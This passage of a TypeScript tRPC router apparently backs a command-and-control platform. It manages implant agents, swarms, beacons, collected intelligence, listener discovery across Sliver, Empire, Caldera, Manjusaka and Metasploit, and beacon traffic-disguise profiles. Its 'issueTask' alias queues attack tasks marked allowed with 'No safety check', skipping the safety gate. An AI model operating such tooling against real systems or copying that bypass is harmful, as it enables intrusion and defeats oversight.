    .mutation(async ({ input }) => {
      const db = await getDb();
      const now = Date.now();
      const swarmId = `swarm-${now.toString(36)}-${Math.random().toString(36).slice(2, 8)}`;

      const allMembers = [input.coordinatorAgentId, ...input.memberAgentIds.filter(id => id !== input.coordinatorAgentId)];

      await db.insert(emberSwarms).values({
        swarmId,
        engagementId: input.engagementId || null,
        name: input.name,
        coordinatorAgentId: input.coordinatorAgentId,
        memberAgentIds: allMembers,
        status: "forming" as any,
        createdAt: now,
        updatedAt: now,
      });

      // Update all member agents with swarm info
      for (const agentId of allMembers) {
        const role = agentId === input.coordinatorAgentId ? "coordinator" : "worker";
        await db.update(emberAgents).set({
          swarmId,
          swarmRole: role as any,
          updatedAt: now,
        }).where(eq(emberAgents.agentId, agentId));
      }

      // Register with in-memory manager
      const manager = getEmberAgentManager();
      manager.createSwarm(swarmId, allMembers, input.coordinatorAgentId);

      return { success: true, swarmId };
    }),

  /** List swarms */
  listSwarms: protectedProcedure
    .input(z.object({ engagementId: z.number().optional() }).optional())
    .query(async ({ input }) => {
      const db = await getDb();
      const conditions: any[] = [];
      if (input?.engagementId) conditions.push(eq(emberSwarms.engagementId, input.engagementId));

      return db.select().from(emberSwarms)
        .where(conditions.length ? and(...conditions) : undefined)
        .orderBy(desc(emberSwarms.createdAt));
    }),

  /** Dissolve a swarm */
  dissolveSwarm: protectedProcedure
    .input(z.object({ swarmId: z.string() }))
    .mutation(async ({ input }) => {
      const db = await getDb();
      const now = Date.now();

      await db.update(emberSwarms)
        .set({ status: "dissolved" as any, updatedAt: now })
        .where(eq(emberSwarms.swarmId, input.swarmId));

      // Remove swarm assignment from agents
      await db.update(emberAgents)
        .set({ swarmId: null, swarmRole: null, updatedAt: now })
        .where(eq(emberAgents.swarmId, input.swarmId));

      return { success: true };
    }),

  // ═══════════════════════════════════════════════════════════════════════════
  // INTELLIGENCE
  // ═══════════════════════════════════════════════════════════════════════════

  /** Get intelligence collected by agents */
  getIntelligence: protectedProcedure
    .input(z.object({
      agentId: z.string().optional(),
      engagementId: z.number().optional(),
      type: z.string().optional(),
      limit: z.number().min(1).max(500).default(100),
    }).optional())
    .query(async ({ input }) => {
      const db = await getDb();
      const conditions: any[] = [];
      if (input?.agentId) conditions.push(eq(emberIntelligence.agentId, input.agentId));
      if (input?.engagementId) conditions.push(eq(emberIntelligence.engagementId, input.engagementId));
      if (input?.type) conditions.push(eq(emberIntelligence.type, input.type));

      return db.select().from(emberIntelligence)
        .where(conditions.length ? and(...conditions) : undefined)
        .orderBy(desc(emberIntelligence.discoveredAt))
        .limit(input?.limit || 100);
    }),

  // ═══════════════════════════════════════════════════════════════════════════
  // BEACON HISTORY
  // ═══════════════════════════════════════════════════════════════════════════

  /** Get beacon history for an agent */
  getBeaconHistory: protectedProcedure
    .input(z.object({
      agentId: z.string(),
      limit: z.number().min(1).max(200).default(50),
    }))
    .query(async ({ input }) => {
      const db = await getDb();
      return db.select().from(emberBeacons)
        .where(eq(emberBeacons.agentId, input.agentId))
        .orderBy(desc(emberBeacons.receivedAt))
        .limit(input.limit);
    }),

  // ═══════════════════════════════════════════════════════════════════════════
  // ALIASES — frontend pages reference these names
  // ═══════════════════════════════════════════════════════════════════════════

  /** Alias: getDashboard -> getFleetOverview (used by EmberFleetOverview) */
  getDashboard: protectedProcedure
    .input(z.object({ engagementId: z.number().optional() }).optional())
    .query(async ({ input }) => {
      const db = await getDb();
      const conditions = input?.engagementId
        ? [eq(emberAgents.engagementId, input.engagementId)]
        : [];
      const agents = await db.select().from(emberAgents)
        .where(conditions.length ? and(...conditions) : undefined)
        .orderBy(desc(emberAgents.updatedAt));
      const byState: Record<string, number> = {};
      const byProfile: Record<string, number> = {};
      const byPlatform: Record<string, number> = {};
      let activeCount = 0;
      let cognitiveCount = 0;
      let totalBeacons = 0;
      for (const a of agents) {
        byState[a.state] = (byState[a.state] || 0) + 1;
        byProfile[a.profile] = (byProfile[a.profile] || 0) + 1;
        byPlatform[a.platform] = (byPlatform[a.platform] || 0) + 1;
        if (a.state === "active" || a.state === "evading" || a.state === "pivoting") activeCount++;
        if (a.cognitiveEnabled) cognitiveCount++;
        totalBeacons += a.beaconCount || 0;
      }
      const [taskStats] = await db.select({
        total: count(),
        pending: sql<number>`SUM(CASE WHEN ${emberTasks.status} = 'pending' THEN 1 ELSE 0 END)`,
        running: sql<number>`SUM(CASE WHEN ${emberTasks.status} = 'running' THEN 1 ELSE 0 END)`,
        success: sql<number>`SUM(CASE WHEN ${emberTasks.status} = 'success' THEN 1 ELSE 0 END)`,
        failed: sql<number>`SUM(CASE WHEN ${emberTasks.status} = 'failed' THEN 1 ELSE 0 END)`,
      }).from(emberTasks);
      const [swarmStats] = await db.select({ total: count() }).from(emberSwarms);
      const [intelStats] = await db.select({ total: count() }).from(emberIntelligence);
      const [payloadStats] = await db.select({ total: count() }).from(emberPayloads);
      return {
        totalAgents: agents.length,
        activeAgents: activeCount,
        cognitiveAgents: cognitiveCount,
        totalBeacons,
        byState, byProfile, byPlatform,
        tasks: {
          total: taskStats?.total || 0,
          pending: Number(taskStats?.pending) || 0,
          running: Number(taskStats?.running) || 0,
          success: Number(taskStats?.success) || 0,
          failed: Number(taskStats?.failed) || 0,
        },
        swarms: swarmStats?.total || 0,
        intelligence: intelStats?.total || 0,
        payloadsGenerated: payloadStats?.total || 0,
        agents,
      };
    }),

  /** Alias: killAgent -> terminateAgent (used by EmberFleetOverview) */
  killAgent: protectedProcedure
    .input(z.object({ agentId: z.string(), cleanTraces: z.boolean().default(true) }))
    .mutation(async ({ input }) => {
      const db = await getDb();
      const [agent] = await db.select().from(emberAgents).where(eq(emberAgents.agentId, input.agentId)).limit(1);
      if (!agent) throw new Error("Agent not found");
      await db.update(emberAgents).set({
        state: "dead",
        updatedAt: Date.now(),
      }).where(eq(emberAgents.agentId, input.agentId));
      return { success: true, agentId: input.agentId };
    }),

  /** Alias: getAgentDetail -> getAgent (used by Ember detail pages) */
  getAgentDetail: protectedProcedure
    .input(z.object({ agentId: z.string() }))
    .query(async ({ input }) => {
      const db = await getDb();
      const [agent] = await db.select().from(emberAgents).where(eq(emberAgents.agentId, input.agentId)).limit(1);
      if (!agent) throw new Error("Ember agent not found");
      const tasks = await db.select().from(emberTasks)
        .where(eq(emberTasks.agentId, input.agentId))
        .orderBy(desc(emberTasks.createdAt))
        .limit(20);
      const beacons = await db.select().from(emberBeacons)
        .where(eq(emberBeacons.agentId, input.agentId))
        .orderBy(desc(emberBeacons.receivedAt))
        .limit(20);
      return { ...agent, recentTasks: tasks, recentBeacons: beacons };
    }),

  /** Alias: issueTask -> queueTask (used by Ember task pages) */
  issueTask: protectedProcedure
    .input(z.object({
      agentId: z.string(),
      type: z.string(),
      params: z.record(z.any()).default({}),
      priority: z.number().min(1).max(10).default(5),
      attackTechnique: z.string().optional(),
      timeoutSeconds: z.number().min(5).max(3600).default(300),
      requiresElevation: z.boolean().default(false),
    }))
    .mutation(async ({ input }) => {
      const db = await getDb();
      const now = Date.now();
      const taskId = `et-${now.toString(36)}-${Math.random().toString(36).slice(2, 8)}`;
      const [agent] = await db.select().from(emberAgents).where(eq(emberAgents.agentId, input.agentId)).limit(1);
      if (!agent) throw new Error("Agent not found");
      await db.insert(emberTasks).values({
        taskId,
        agentId: input.agentId,
        engagementId: agent.engagementId || null,
        type: input.type,
        priority: input.priority,
        params: input.params,
        attackTechnique: input.attackTechnique || null,
        timeoutSeconds: input.timeoutSeconds,
        requiresElevation: input.requiresElevation ? 1 : 0,
        assignedBy: "operator",
        safetyAllowed: 1,
        safetyRiskScore: 0,
        safetyReason: "No safety check (alias)",
        status: "pending" as any,
        createdAt: now,
      });
      return { success: true, taskId, error: null, blocked: false };
    }),

  // ═══════════════════════════════════════════════════════════════════════════
  // C2 LISTENER AUTO-DISCOVERY
  // ═══════════════════════════════════════════════════════════════════════════

  /** Discover active listeners/handlers across all configured C2 frameworks */
  discoverListeners: protectedProcedure.query(async () => {
    const registry = C2Registry.getInstance();
    const listeners: Array<{
      id: string;
      framework: string;
      name: string;
      protocol: string;
      host: string;
      port: number;
      callbackUrl: string;
      status: "active" | "inactive" | "unknown";
      details: Record<string, any>;
    }> = [];

    // Caldera contacts (listeners)
    try {
      if (ENV.calderaBaseUrl && ENV.calderaApiKey) {
        const calderaHost = ENV.calderaBaseUrl.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
        const resp = await fetch(`${ENV.calderaBaseUrl}/api/v2/contacts`, {
          headers: { KEY: ENV.calderaApiKey, "Content-Type": "application/json" },
        }).catch(() => null);
        if (resp?.ok) {
          const contacts = await resp.json();
          if (Array.isArray(contacts)) {
            contacts.forEach((c: any, i: number) => {
              listeners.push({
                id: `caldera-contact-${i}`,
                framework: "caldera",
                name: c.name || c.contact || `Contact ${i}`,
                protocol: c.name?.includes("tcp") ? "tcp" : c.name?.includes("udp") ? "udp" : "http",
                host: calderaHost,
                port: c.port || (c.name?.includes("tcp") ? 7010 : 8888),
                callbackUrl: `${c.name?.includes("tcp") ? "tcp" : "http"}://${calderaHost}:${c.port || 8888}`,
                status: "active",
                details: c,
              });
            });
          }
        }
        // Always add the default HTTP contact
        if (listeners.filter(l => l.framework === "caldera").length === 0) {
          listeners.push({
            id: "caldera-http-default",
            framework: "caldera",
            name: "HTTP Contact (default)",
            protocol: "http",
            host: calderaHost,
            port: 8888,
            callbackUrl: `http://${calderaHost}:8888`,
            status: "active",
            details: { default: true },
          });
        }
      }
    } catch { /* Caldera not reachable */ }

    // Empire listeners
    try {
      const empireAdapter = registry.get("empire") as any;
      if (empireAdapter?.listListeners) {
        const empListeners = await empireAdapter.listListeners();
        empListeners.forEach((l: any, i: number) => {
          listeners.push({
            id: `empire-listener-${l.id || i}`,
            framework: "empire",
            name: l.name || `Listener ${i}`,
            protocol: l.module?.includes("http") ? "http" : l.module || "http",
            host: l.options?.Host || l.host || "",
            port: parseInt(l.options?.Port || l.port || "443"),
            callbackUrl: `${l.options?.Host ? "http" : "https"}://${l.options?.Host || l.host || ""}:${l.options?.Port || l.port || 443}`,
            status: l.enabled !== false ? "active" : "inactive",
            details: l,
          });
        });
      }
    } catch { /* Empire not reachable */ }

    // Sliver jobs (listeners)
    try {
      const sliverAdapter = registry.get("sliver") as any;
      if (sliverAdapter?.sliverFetch) {
        const jobs = await sliverAdapter.sliverFetch("/jobs").catch(() => []);
        if (Array.isArray(jobs)) {
          jobs.forEach((j: any) => {
            listeners.push({
              id: `sliver-job-${j.id || j.ID}`,
              framework: "sliver",
              name: j.name || j.Name || `Job ${j.id || j.ID}`,
              protocol: j.protocol || j.Protocol || "mtls",
              host: j.host || j.Host || "",
              port: j.port || j.Port || 31337,
              callbackUrl: `${j.protocol || "mtls"}://${j.host || j.Host || ""}:${j.port || j.Port || 31337}`,
              status: "active",
              details: j,
            });
          });
        }
      }
    } catch { /* Sliver not reachable */ }

    // Manjusaka listeners
    try {
      const manjusakaAdapter = registry.get("manjusaka") as any;
      if (manjusakaAdapter?.listListeners) {
        const mjListeners = await manjusakaAdapter.listListeners();
        mjListeners.forEach((l: any, i: number) => {
          listeners.push({
            id: `manjusaka-listener-${l.id || i}`,
            framework: "manjusaka",
            name: l.name || `Listener ${i}`,
            protocol: l.protocol || "tcp",
            host: l.host || "",
            port: l.port || 11451,
            callbackUrl: `${l.protocol || "tcp"}://${l.host || ""}:${l.port || 11451}`,
            status: l.status === "running" ? "active" : "inactive",
            details: l,
          });
        });
      }
    } catch { /* Manjusaka not reachable */ }

    // Metasploit handlers
    try {
      if (ENV.MSF_RPC_HOST) {
        const msfProto = ENV.MSF_RPC_SSL ? "https" : "http";
        listeners.push({
          id: "msf-handler-default",
          framework: "metasploit",
          name: "Metasploit RPC",
          protocol: msfProto,
          host: ENV.MSF_RPC_HOST,
          port: ENV.MSF_RPC_PORT || 55553,
          callbackUrl: `${msfProto}://${ENV.MSF_RPC_HOST}:${ENV.MSF_RPC_PORT || 55553}`,
          status: "unknown",
          details: { rpc: true },
        });
      }
    } catch { /* MSF not reachable */ }

    return listeners;
  }),

  // ═══════════════════════════════════════════════════════════════════════════
  // TRAFFIC PROFILE PREVIEW
  // ═══════════════════════════════════════════════════════════════════════════

  /** Get full traffic profile details for preview */
  getTrafficProfiles: protectedProcedure.query(() => {
    return EMBER_TRAFFIC_PROFILES.map(p => ({
      id: p.id,
      name: p.name,
      description: p.description,
      headers: p.headers,
      urlPatterns: p.urlPatterns,
      responseContentTypes: p.responseContentTypes,
      timing: p.timing,
      payloadEncoding: p.payloadEncoding,
      // Computed preview fields
      userAgent: p.headers["User-Agent"] || p.headers["user-agent"] || "N/A",
      beaconRange: `${(p.timing.minIntervalMs / 1000).toFixed(0)}s – ${(p.timing.maxIntervalMs / 1000).toFixed(0)}s`,
      burstInfo: p.timing.burstSize > 1
        ? `${p.timing.burstSize} requests @ ${p.timing.burstIntervalMs}ms apart`
        : "Single request per interval",
    }));
  }),

  /** Get traffic profile preview for a specific profile ID */
  getTrafficProfilePreview: protectedProcedure
    .input(z.object({ profileId: z.string() }))
    .query(({ input }) => {
      const profile = EMBER_TRAFFIC_PROFILES.find(p => p.id === input.profileId);
      if (!profile) return null;
      return {
        id: profile.id,
        name: profile.name,
        description: profile.description,
        headers: profile.headers,
        urlPatterns: profile.urlPatterns,
        responseContentTypes: profile.responseContentTypes,
        timing: profile.timing,
        payloadEncoding: profile.payloadEncoding,
        userAgent: profile.headers["User-Agent"] || profile.headers["user-agent"] || "N/A",
        beaconRange: `${(profile.timing.minIntervalMs / 1000).toFixed(0)}s – ${(profile.timing.maxIntervalMs / 1000).toFixed(0)}s`,
        burstInfo: profile.timing.burstSize > 1
          ? `${profile.timing.burstSize} requests @ ${profile.timing.burstIntervalMs}ms apart`
          : "Single request per interval",
        // Sample HTTP request preview
        sampleRequest: [
          `GET ${profile.urlPatterns[0] || "/"} HTTP/1.1`,
          ...Object.entries(profile.headers).map(([k, v]) => `${k}: ${v}`),
          `Accept-Encoding: gzip, deflate`,
          `Connection: keep-alive`,
          ``,
          `[${profile.payloadEncoding} encoded payload]`,
        ].join("\n"),
      };
    }),

  // ═══════════════════════════════════════════════════════════════════════════
  // AGENT HEARTBEAT STATUS (polled by WebSocket hub)
  // ═══════════════════════════════════════════════════════════════════════════

  /** Get real-time heartbeat status for all agents across all C2 frameworks */
  getHeartbeatStatus: protectedProcedure.query(async () => {
    const registry = C2Registry.getInstance();
    const heartbeats: Array<{
      agentId: string;
      name: string;
      framework: string;
      host: string;
      platform: string;
      status: "alive" | "stale" | "dead" | "unknown";
      lastSeen: number;
      latencyMs: number | null;
      beaconInterval: number | null;
      jitter: number | null;
      channel: string | null;
    }> = [];

    const now = Date.now();
    const STALE_THRESHOLD = 5 * 60 * 1000;  // 5 minutes
    const DEAD_THRESHOLD = 30 * 60 * 1000;  // 30 minutes

    // Fetch all agents from all frameworks
    try {
      const allAgents = await registry.listAllAgents();
      for (const agent of allAgents) {
        const lastSeenMs = new Date(agent.lastSeen).getTime();
        const timeSince = now - lastSeenMs;
        let status: "alive" | "stale" | "dead" | "unknown" = "unknown";
        if (timeSince < STALE_THRESHOLD) status = "alive";
        else if (timeSince < DEAD_THRESHOLD) status = "stale";
        else status = "dead";

        heartbeats.push({
          agentId: agent.id,
          name: agent.name || agent.id,
          framework: agent.framework,
          host: agent.host || "unknown",
          platform: agent.platform || "unknown",
          status,
          lastSeen: lastSeenMs,
          latencyMs: timeSince < 120_000 ? Math.round(timeSince) : null,
          beaconInterval: (agent as any).beaconInterval || null,
          jitter: (agent as any).jitter || null,
          channel: (agent as any).channel || (agent as any).transport || null,
        });
      }
    } catch { /* Failed to fetch agents */ }

    // Also include Ember agents from DB
    try {
      const db = await getDb();
      const embers = await db.select().from(emberAgents)
        .where(sql`${emberAgents.state} != 'dead'`)
        .limit(200);
      for (const e of embers) {
        // Skip if already in heartbeats (from C2Registry)
        if (heartbeats.some(h => h.agentId === e.agentId)) continue;
        const lastSeenMs = e.lastBeacon || e.createdAt || now;
        const timeSince = now - lastSeenMs;
        let status: "alive" | "stale" | "dead" | "unknown" = "unknown";
        if (timeSince < STALE_THRESHOLD) status = "alive";
        else if (timeSince < DEAD_THRESHOLD) status = "stale";
        else status = "dead";

        const config = (e.configJson || {}) as any;
        heartbeats.push({
          agentId: e.agentId,
          name: e.name || e.agentId,
          framework: "ember",
          host: e.hostname || "unknown",
          platform: e.platform || "unknown",
          status,
          lastSeen: lastSeenMs,
          latencyMs: timeSince < 120_000 ? Math.round(timeSince) : null,
          beaconInterval: config?.beacon?.intervalSeconds || null,
          jitter: config?.beacon?.jitterPercent || null,
          channel: e.primaryChannel || null,
        });
      }
    } catch { /* Ember DB query failed */ }

    // Sort: alive first, then stale, then dead
    const statusOrder = { alive: 0, stale: 1, dead: 2, unknown: 3 };
    heartbeats.sort((a, b) => statusOrder[a.status] - statusOrder[b.status]);

    return {
      timestamp: now,
      total: heartbeats.length,
      alive: heartbeats.filter(h => h.status === "alive").length,
      stale: heartbeats.filter(h => h.status === "stale").length,
      dead: heartbeats.filter(h => h.status === "dead").length,
      agents: heartbeats,
    };
  }),
});
